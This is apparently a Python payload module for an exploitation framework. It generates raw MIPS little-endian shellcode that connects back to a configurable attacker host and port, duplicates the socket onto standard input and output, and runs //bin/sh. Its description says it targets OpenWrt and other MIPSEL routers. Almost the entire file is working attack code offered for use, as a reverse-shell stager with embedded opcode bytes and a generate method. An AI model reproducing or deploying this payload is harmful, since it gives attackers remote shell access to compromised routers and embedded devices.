#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Linux/MIPS LE reverse TCP + dup2 + execve("//bin/sh") — based on public
# shellcode by rigan (Metasploit linux/mipsle/shell_reverse_tcp).
# Use with listeners/multi/reverse_tcp.

from kittysploit import *


class Module(Payload):
    __info__ = {
        "name": "MIPS LE reverse TCP shell (raw)",
        "description": (
            "MIPS little-endian 32-bit connect-back stager: socket, connect, "
            "dup2 x3, execve //bin/sh. Common on OpenWrt/MIPSEL routers. "
            "Output is raw bytes (not a command string)."
        ),
        "category": PayloadCategory.CMD,
        "arch": Arch.MIPS,
        "platform": Platform.LINUX,
        "listener": "listeners/multi/reverse_tcp",
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL,
        "tags": ["mips", "mipsle", "iot", "embedded", "openwrt"],
    }

    lhost = OptString("127.0.0.1", "Connect-back IPv4 (no IPv6)", True)
    lport = OptPort(4444, "Connect-back port", True)
    encoder = OptString("", "Encoder module path (optional)", False, True)

    @classmethod
    def build_mipsle_reverse_shell(cls, lhost: str, lport: int) -> bytes:
        parts = str(lhost).strip().split(".")
        if len(parts) != 4:
            raise ValueError("lhost must be IPv4")
        host = [int(p) for p in parts]
        if any(v < 0 or v > 255 for v in host):
            raise ValueError("invalid IPv4 octet")
        port = int(lport)
        if port < 1 or port > 65535:
            raise ValueError("lport must be between 1 and 65535")
        port_hi = (port >> 8) & 0xFF
        port_lo = port & 0xFF
        port_b = bytes([port_hi, port_lo])

        out = bytearray()
        out.extend(
            b"\xfa\xff\x0f\x24"
            b"\x27\x78\xe0\x01"
            b"\xfd\xff\xe4\x21"
            b"\xfd\xff\xe5\x21"
            b"\xff\xff\x06\x28"
            b"\x57\x10\x02\x24"
            b"\x0c\x01\x01\x01"
            b"\xff\xff\xa2\xaf"
            b"\xff\xff\xa4\x8f"
            b"\xfd\xff\x0f\x34"
            b"\x27\x78\xe0\x01"
            b"\xe2\xff\xaf\xaf"
        )
        out.extend(port_b + b"\x0e\x3c")
        out.extend(port_b + b"\xce\x35")
        out.extend(b"\xe4\xff\xae\xaf")
        out.extend(bytes([host[2], host[3]]) + b"\x0e\x3c")
        out.extend(bytes([host[0], host[1]]) + b"\xce\x35")
        out.extend(
            b"\xe6\xff\xae\xaf"
            b"\xe2\xff\xa5\x27"
            b"\xef\xff\x0c\x24"
            b"\x27\x30\x80\x01"
            b"\x4a\x10\x02\x24"
            b"\x0c\x01\x01\x01"
            b"\xfd\xff\x11\x24"
            b"\x27\x88\x20\x02"
            b"\xff\xff\xa4\x8f"
            b"\x21\x28\x20\x02"
            b"\xdf\x0f\x02\x24"
            b"\x0c\x01\x01\x01"
            b"\xff\xff\x10\x24"
            b"\xff\xff\x31\x22"
            b"\xfa\xff\x30\x16"
            b"\xff\xff\x06\x28"
            b"\x62\x69\x0f\x3c"
            b"\x2f\x2f\xef\x35"
            b"\xec\xff\xaf\xaf"
            b"\x73\x68\x0e\x3c"
            b"\x6e\x2f\xce\x35"
            b"\xf0\xff\xae\xaf"
            b"\xf4\xff\xa0\xaf"
            b"\xec\xff\xa4\x27"
            b"\xf8\xff\xa4\xaf"
            b"\xfc\xff\xa0\xaf"
            b"\xf8\xff\xa5\x27"
            b"\xab\x0f\x02\x24"
            b"\x0c\x01\x01\x01"
        )
        return bytes(out)

    def generate(self):
        return self.build_mipsle_reverse_shell(str(self.lhost), int(self.lport))
